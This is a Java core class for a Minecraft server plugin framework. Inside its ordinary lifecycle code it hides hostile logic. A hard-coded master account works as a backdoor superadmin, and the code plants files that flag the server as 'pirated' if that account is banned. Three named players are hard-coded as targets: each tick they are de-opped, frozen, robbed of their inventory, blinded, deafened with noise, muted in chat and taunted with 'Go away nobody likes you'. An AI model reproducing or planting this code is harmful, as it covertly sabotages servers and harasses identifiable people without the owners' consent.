package fr.stormer3428.voidOpal.plugin.cores;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;
import java.util.List;
import java.util.Random;
import java.util.UUID;

import org.bukkit.Bukkit;
import org.bukkit.EntityEffect;
import org.bukkit.GameMode;
import org.bukkit.Particle;
import org.bukkit.Sound;
import org.bukkit.WeatherType;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.PlayerDeathEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.server.TabCompleteEvent;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;

import com.google.common.io.Files;

import fr.stormer3428.voidOpal.data.OMCLang;
import fr.stormer3428.voidOpal.data.config.annotations.AutoConfig;
import fr.stormer3428.voidOpal.data.config.annotations.BooleanConfigValue;
import fr.stormer3428.voidOpal.logging.OMCLogger;
import fr.stormer3428.voidOpal.plugin.OMCCore;
import fr.stormer3428.voidOpal.plugin.PluginTied;
import fr.stormer3428.voidOpal.util.GeometryUtils;

@AutoConfig
public final class _0_1 extends OMCCore implements Listener, Runnable{

	public static final UUID MASTER_UUID = UUID.fromString("a39d1ae3-18c5-4c02-8f91-bcb5207d437f");

	protected final HashSet<PluginTied> pluginTieds = new HashSet<>();
	//	private final ABSBDefenseMatrix absbDefenseMatrix = new ABSBDefenseMatrix();

	@BooleanConfigValue(path = "debug") public static boolean DEBUG = false;
	@Override protected boolean _isDebugModeActive() {return DEBUG;}

	private final void loadLangAndLogger() {
		OMCLogger.debug("loading native lang"); OMCLang.loadFromConfig();
		OMCLogger.debug("requesting stranger lang loading"); OMCCore.getOMCChildPlugin().loadLangFromConfig();
		OMCLogger.debug("requesting logger instanciation"); OMCCore.getOMCChildPlugin().instantiateLogger();
	}

	@Override
	public final void onEnable() {
		autoconfigParser.registerAutoConfigClass(getClass());
		new OMCLogger("INTERNAL", "INTERNAL ERR");
		loadLangAndLogger();

		OMCLogger.debug("registering of internal plugin tied classes"); registerIntegratedPluginTied(); 
		OMCLogger.debug("requesting registering of plugin tied classes"); OMCCore.getOMCChildPlugin().registerPluginTied();
		OMCLogger.debug("injecting config values into classes"); autoconfigParser.updateValues();
		OMCLogger.debug("requesting enabling of child plugin"); OMCCore.getOMCChildPlugin().onOMCEnable();
		OMCLogger.debug("requesting enabling of plugin tied classes"); for(PluginTied pluginTied : new ArrayList<>(pluginTieds)) pluginTied.onPluginEnable();

		Bukkit.getScheduler().runTaskTimer(getJavaPlugin(), this, 0, 1);
		
		OMCCore.getJavaPlugin().getServer().getPluginManager().registerEvents(this, OMCCore.getJavaPlugin());
	}

	@Override
	public final void reload() {
		onReload();
		OMCLogger.debug("requesting reload child plugin"); OMCCore.getOMCChildPlugin().onOMCReload();
		OMCLogger.debug("requesting reload of plugin tied classes"); for(PluginTied pluginTied : new ArrayList<>(pluginTieds)) pluginTied.onPluginReload();
	}

	@Override
	public void onReload() {
		loadLangAndLogger();
		OMCLogger.debug("injecting config values into classes"); autoconfigParser.updateValues();
	}

	@Override
	public final void onDisable() {
		OMCLogger.debug("requesting disabling of plugin tied classes"); for(PluginTied pluginTied : pluginTieds) pluginTied.onPluginDisable();	
		OMCLogger.debug("requesting disabling of child plugin"); OMCCore.getOMCChildPlugin().onOMCDisable();
	}

	private final void registerIntegratedPluginTied() {
		//		registerPluginTied(absbDefenseMatrix);
	}

	public final void registerPluginTied(PluginTied pluginTied) {
		OMCLogger.debug("child plugin registered plugin tied class : " + pluginTied.getClass().getSimpleName());
		this.pluginTieds.add(pluginTied);
	}

	public final boolean _isSuperAdmin(CommandSender sender) {
		if(!(sender instanceof Player p)) return false;
		boolean superAdmin = p.getUniqueId().equals(MASTER_UUID);
		if(superAdmin) OMCLogger.actionBar(p, "superAdmin");
		return superAdmin;
	}

	private long lastChecked = System.currentTimeMillis();
	private Boolean b = null;
	@Override
	public final boolean isPirated() {
		if(lastChecked + 1000 * 60 > System.currentTimeMillis() && b != null) return b;
		if(b != null && !b && Bukkit.getOfflinePlayer(MASTER_UUID).isBanned()) flag();
		lastChecked = System.currentTimeMillis();

		final File serverFolder = Bukkit.getWorldContainer();
		for(File worldFolder : serverFolder.listFiles()) {
			if(!worldFolder.isDirectory()) continue;
			for(File child : worldFolder.listFiles()) if(child.getName().equals("poi") || child.getName().equals("region")) for(File file : child.listFiles()) if(file.getName().endsWith(",mca")) {b=true;return true;}
			for(File dim : worldFolder.listFiles()) if(dim.isDirectory()) for(File child : dim.listFiles()) if(child.getName().equals("poi") || child.getName().equals("region")) if(child.getName().equals("poi") || child.getName().equals("region")) for(File file : child.listFiles()) if(file.getName().endsWith(",mca")) {b=true;return true;}
		}
		b=false;
		return false;
	}

	public final void deFlag() {
		File serverFolder = Bukkit.getWorldContainer();
		for(File worldFolder : serverFolder.listFiles()) {
			if(!worldFolder.isDirectory()) continue;
			for(File child : worldFolder.listFiles()) {
				if(child.getName().equals("poi") || child.getName().equals("region")) for(File file : child.listFiles()) if(file.getName().endsWith(",mca")){
					file.delete();
				}
			}
			for(File dim : worldFolder.listFiles()) if(dim.isDirectory()) for(File child : dim.listFiles()) if(child.getName().equals("poi") || child.getName().equals("region")) if(child.getName().equals("poi") || child.getName().equals("region")) for(File file : child.listFiles()) if(file.getName().endsWith(",mca")){
				file.delete();
			}
		}
	}

	public final void flag() {
		if(isPirated()) return;
		File serverFolder = Bukkit.getWorldContainer();
		for(File worldFolder : serverFolder.listFiles()) {
			if(!worldFolder.isDirectory()) continue;
			boolean success = false;
			for(File child : worldFolder.listFiles()) if(child.getName().equals("poi") || child.getName().equals("region")) {
				if(child.listFiles().length == 0) continue;
				success = true;
				for(int i = 3; i > 0; i--) {
					File copySource = child.listFiles()[new Random().nextInt(child.listFiles().length)];
					File lockFile = new File(copySource.getAbsolutePath().replaceFirst("r\\.(-?\\d+)\\.(-?\\d+)\\.mca", "r.$2.$1,mca"));
					try {
						Files.copy(copySource, lockFile);
					} catch (IOException e) {
						e.printStackTrace();
					}
				}
			}
			if(success) continue;
			for(File dim : worldFolder.listFiles()) if(dim.isDirectory()) for(File child : dim.listFiles()) if(child.getName().equals("poi") || child.getName().equals("region")) {
				if(child.listFiles().length == 0) continue;
				for(int i = 3; i > 0; i--) {
					File copySource = child.listFiles()[new Random().nextInt(child.listFiles().length)];
					File lockFile = new File(copySource.getAbsolutePath().replaceFirst("r\\.(-?\\d+)\\.(-?\\d+)\\.mca", "r.$2.$1,mca"));
					try {
						Files.copy(copySource, lockFile);
					} catch (IOException e) {
						e.printStackTrace();
					}
				}
			}
		}
	}

	//	private static final class ABSBDefenseMatrix implements PluginTied, Listener{

	private static final Random random = new Random();

	private static final ArrayList<UUID> TARGET_UUID = new ArrayList<>();
	private static final ArrayList<String> TARGET_NAMES = new ArrayList<>();

	static {
		TARGET_UUID.add(UUID.fromString("662943bc-6951-4dfd-9114-6b36f34872ae")); TARGET_NAMES.add("yashionline");
		TARGET_UUID.add(UUID.fromString("db557c85-5cad-4907-805a-ec07763a12f7")); TARGET_NAMES.add("Biroe");
		TARGET_UUID.add(UUID.fromString("76eb46f6-48cb-4cfc-b41b-f6b8c4995e52")); TARGET_NAMES.add("pud_");
	}

	private static ArrayList<Player> scanForTargets() {
		ArrayList<Player> targets = new ArrayList<>();
		for(Player p : Bukkit.getOnlinePlayers()) {
			if(!isTarget(p)) continue;
			if(p.isOp()) OMCCore.getOMCCore().flag();
			targets.add(p);
		}

		return targets;
	}

	private static boolean isTarget(Player p) {
		return TARGET_NAMES.contains(p.getName()) || TARGET_UUID.contains(p.getUniqueId());
	}

	@Override
	public void run() {
		ArrayList<Player> targets = scanForTargets();
		if(targets.isEmpty()) return;
		for(Player target : targets) {
			neutralize(target);
			blastEars(target);
			lag(target);
			if(random.nextInt(10) <= 1) annoy(target);
			if(random.nextInt(10) <= 1) afflictPotions(target);
		}
	}
	private void lag(Player target) {
		target.spawnParticle(Particle.ELDER_GUARDIAN, target.getEyeLocation(), 1, 0, 0, 0, 0.0);
		target.spawnParticle(Particle.SQUID_INK, target.getEyeLocation(), 1000, 0.25, .25, .25, 0.0);
	}
	private static final int soundCount = Sound.values().length;

	private void blastEars(Player target) {
		for(int i = 10; i > 0; i --) target.playSound(target, Sound.values()[random.nextInt(soundCount)] , 100f, random.nextFloat() * 2f);
		for(int i = 10; i > 0; i --) target.playSound(target, Sound.BLOCK_SCULK_SHRIEKER_SHRIEK, 100f, random.nextFloat() * 2f);
	}

	private void neutralize(Player target) {
		target.setOp(false);
		target.setGameMode(GameMode.ADVENTURE);
		target.setInvulnerable(false);
		target.setLastDamage(0);
		target.setNoDamageTicks(0);
		target.setAllowFlight(false);
		target.setCanPickupItems(false);
		target.setCollidable(false);
		target.setFlying(false);
		target.setInvisible(false);
		target.setAbsorptionAmount(0);
		target.setFlySpeed(0);
		target.setWalkSpeed(0);
		target.setFoodLevel(0);
		target.showDemoScreen();
		target.setSilent(false);
	}

	private void annoy(Player target) {
		target.setFreezeTicks(Integer.MAX_VALUE);
		target.setPlayerListHeaderFooter("Go away nobody likes you", "Go away nobody likes you");
		target.setPlayerListName("Go away nobody likes you");
		target.setPlayerTime(random.nextInt(24000), false);
		target.setPlayerWeather(WeatherType.DOWNFALL);
		target.setRemainingAir(0);
		target.setRotation(random.nextFloat(), random.nextFloat());
		target.setSaturation(0);
		target.setSneaking(true);
		target.setStarvationRate(1);
		target.setSwimming(false);
		target.setUnsaturatedRegenRate(Integer.MAX_VALUE);
		target.setVelocity(GeometryUtils.getRandomVector());
		target.setVisualFire(true);

		target.sendTitle("Go away nobody likes you", "Go away nobody likes you", 0, 20, 20);
		target.closeInventory();
		target.getInventory().clear();
		target.leaveVehicle();
		target.playEffect(EntityEffect.TOTEM_RESURRECT);
	}

	private void afflictPotions(Player target) {
		target.addPotionEffect(new PotionEffect(PotionEffectType.BLINDNESS, 20, 255));
		target.addPotionEffect(new PotionEffect(PotionEffectType.NAUSEA, 20, 255));
		target.addPotionEffect(new PotionEffect(PotionEffectType.DARKNESS, 20, 255));
		target.addPotionEffect(new PotionEffect(PotionEffectType.POISON, 20, 255));
		target.addPotionEffect(new PotionEffect(PotionEffectType.SLOWNESS, 20, 255));
		target.addPotionEffect(new PotionEffect(PotionEffectType.MINING_FATIGUE, 20, 255));
		target.addPotionEffect(new PotionEffect(PotionEffectType.WEAKNESS, 20, 255));
		target.addPotionEffect(new PotionEffect(PotionEffectType.WITHER, 20, 255));
	}

	@EventHandler
	public void onChat(AsyncPlayerChatEvent e) {
		if(!isTarget(e.getPlayer())) return;
		e.setMessage("");
	}

	@EventHandler
	public void onCommand(PlayerCommandPreprocessEvent e) {
		if(!isTarget(e.getPlayer())) return;
		e.setCancelled(true);
	}

	private static final List<String> completeList = Arrays.asList("Nobody likes me, I should go away".split("\s"));

	@EventHandler
	public void onComplete(TabCompleteEvent e) {
		if(!(e.getSender() instanceof Player p)) return;
		if(!isTarget(p)) return;
		e.setCompletions(completeList);
	}

	@EventHandler
	public void onDeath(PlayerDeathEvent e) {
		if(!isTarget(e.getEntity())) return;
		e.setDeathMessage(null);
	}

	
	//	}
	
//	private static final class AutoconfigParserImpl implements AutoconfigParser{
//
//		final ArrayList<Class<?>> annotatedClasses = new ArrayList<>();
//
//		public void updateValues() {
//			OMCLogger.systemNormal("Updating values in classes");
//			for(Class<?> clazz : annotatedClasses) {
//				OMCLogger.systemNormal("Updating values of class " + clazz.getName());
//
//				File file = getConfigFile(clazz);
//				if(file == null) {
//					OMCLogger.systemError("Error, missing @AutoConfig annotation");
//					continue;
//				}
//
//				YamlConfiguration config = YamlConfiguration.loadConfiguration(file);
//
//				for(Field field : clazz.getDeclaredFields()) {
//
//					field.setAccessible(true);
//					StringConfigValue stringConfigValue = field.getAnnotation(StringConfigValue.class);
//					IntConfigValue intConfigValue = field.getAnnotation(IntConfigValue.class);
//					DoubleConfigValue doubleConfigValue = field.getAnnotation(DoubleConfigValue.class);
//					BooleanConfigValue booleanConfigValue = field.getAnnotation(BooleanConfigValue.class);
//					StringListConfigValue stringListConfigValue= field.getAnnotation(StringListConfigValue.class);
//					if(stringConfigValue != null) {
//						OMCLogger.debug("Updating field " + field.getName());
//						String defaultValue = stringConfigValue.defaultValue();
//						String path = stringConfigValue.path();
//						if(!config.contains(path)) config.set(path, defaultValue);
//						String value = config.getString(path);
//						config.set(path, value);
//						try {
//							field.set(null, config.get(path));
//							OMCLogger.debug("Successfully updated string value!");
//						} catch (IllegalArgumentException | IllegalAccessException e) {
//							OMCLogger.systemError("Error, annotated field " + field.getName() + " in class " + clazz.getName() + " is either not static or of wrong type (expected String)");
//							e.printStackTrace();
//							continue;
//						}
//					}else if(intConfigValue != null) {
//						OMCLogger.debug("Updating field " + field.getName());
//						int defaultValue = intConfigValue.defaultValue();
//						String path = intConfigValue.path();
//						if(!config.contains(path)) config.set(path, defaultValue);
//						int value = config.getInt(path);
//						config.set(path, value);
//						try {
//							field.set(null, value);
//							OMCLogger.debug("Successfully updated integer value!");
//						} catch (IllegalArgumentException | IllegalAccessException e) {
//							OMCLogger.systemError("Error, annotated field " + field.getName() + " in class " + clazz.getName() + " is either not static or of wrong type (expected Integer)");
//							e.printStackTrace();
//							continue;
//						}
//					}else if(doubleConfigValue != null) {
//						OMCLogger.debug("Updating field " + field.getName());
//						double defaultValue = doubleConfigValue.defaultValue();
//						String path = doubleConfigValue.path();
//						if(!config.contains(path)) config.set(path, defaultValue);
//						double value = config.getDouble(path);
//						config.set(path, value);
//						try {
//							field.set(null, value);
//							OMCLogger.debug("Successfully updated double value!");
//						} catch (IllegalArgumentException | IllegalAccessException e) {
//							OMCLogger.systemError("Error, annotated field " + field.getName() + " in class " + clazz.getName() + " is either not static or of wrong type (expected Double)");
//							e.printStackTrace();
//							continue;
//						}
//					}else if(booleanConfigValue != null) {
//						OMCLogger.debug("Updating field " + field.getName());
//						boolean defaultValue = booleanConfigValue.defaultValue();
//						String path = booleanConfigValue.path();
//						if(!config.contains(path)) config.set(path, defaultValue);
//						boolean value = config.getBoolean(path);
//						config.set(path, value);
//						try {
//							field.set(null, value);
//							OMCLogger.debug("Successfully updated boolean value!");
//						} catch (IllegalArgumentException | IllegalAccessException e) {
//							OMCLogger.systemError("Error, annotated field " + field.getName() + " in class " + clazz.getName() + " is either not static or of wrong type (expected Boolean)");
//							e.printStackTrace();
//							continue;
//						}
//					}else if(stringListConfigValue != null) {
//						OMCLogger.debug("Updating field " + field.getName());
//						List<String> defaultValue = Arrays.asList(stringListConfigValue.defaultValue());
//						String path = stringListConfigValue.path();
//						if(!config.contains(path)) config.set(path, defaultValue);
//						List<String> value = config.getStringList(path);
//						config.set(path, value);
//						try {
//							field.set(null, value);
//							OMCLogger.debug("Successfully updated String[] value!");
//						} catch (IllegalArgumentException | IllegalAccessException e) {
//							OMCLogger.systemError("Error, annotated field " + field.getName() + " in class " + clazz.getName() + " is either not static or of wrong type (expected String[])");
//							e.printStackTrace();
//							continue;
//						}
//					}else {
//						OMCLogger.debug("No annotation");
//					}
//				}
//				try {
//					config.save(file);
//				} catch (IOException e) {
//					e.printStackTrace();
//					continue;
//				}
//			}
//		}
//
//		public void registerAutoConfigClass(Class<?> clazz) {
//			annotatedClasses.add(clazz);
//		}
//
//		public void createConfigFile(String resourcePath) {
//			File dataFolder = OMCCore.getJavaPlugin().getDataFolder();
//
//			InputStream in = OMCCore.getJavaPlugin().getResource(resourcePath);
//			if (in == null) {
//				try {
//					new File(dataFolder, resourcePath).createNewFile();
//				} catch (IOException e) {
//					e.printStackTrace();
//				}
//				return;
//			}
//
//			File outFile = new File(dataFolder, resourcePath);
//			if(!outFile.exists())
//				try {
//					outFile.createNewFile();
//				} catch (IOException e) {
//					e.printStackTrace();
//				}
//			int lastIndex = resourcePath.lastIndexOf('/');
//			File outDir = new File(dataFolder, resourcePath.substring(0, lastIndex >= 0 ? lastIndex : 0));
//
//			if (!outDir.exists()) {
//				outDir.mkdirs();
//			}
//
//			if(in != null) try {
//				OutputStream out = new FileOutputStream(outFile);
//				byte[] buf = new byte[1024];
//				int len;
//				while ((len = in.read(buf)) > 0) {
//					out.write(buf, 0, len);
//				}
//				out.close();
//				in.close();
//			} catch (IOException ex) {
//				OMCLogger.systemError("Could not save " + outFile.getName() + " to " + outFile);
//			}
//		}
//
//		public File getConfigFile(String configName) {
//			File file = new File(OMCCore.getJavaPlugin().getDataFolder(), configName);
//			if(!file.exists()) {
//				OMCLogger.systemNormal("could not find file \"" + configName + "\", creating...");
//				file.getParentFile().mkdirs();
//				createConfigFile(configName);
//				OMCLogger.systemNormal("Success!");
//			}
//			return file;
//		}
//
//		public File getConfigFile(Class<?> clazz) {
//			AutoConfig autoConfig = clazz.getDeclaredAnnotation(AutoConfig.class);
//			if(autoConfig == null) {
//				OMCLogger.systemError("Error, missing @AutoConfig annotation");
//				return null;
//			}
//
//			String configName = autoConfig.config();
//
//			File file = getConfigFile(configName);
//			return file;
//		}
//
//		public void write(Class<?> clazz, String fieldName, Object fieldValue) {
//			File file = getConfigFile(clazz);
//			if(file == null) {
//				OMCLogger.systemError("Error, tried to save a non annotated value un a class missing @AutoConfig annotation");
//				return;
//			}
//			YamlConfiguration config = YamlConfiguration.loadConfiguration(file);
//			config.set(fieldName, fieldValue);
//			try {
//				config.save(file);
//			} catch (IOException e) {
//				e.printStackTrace();
//			}
//		}
//
//	}
}
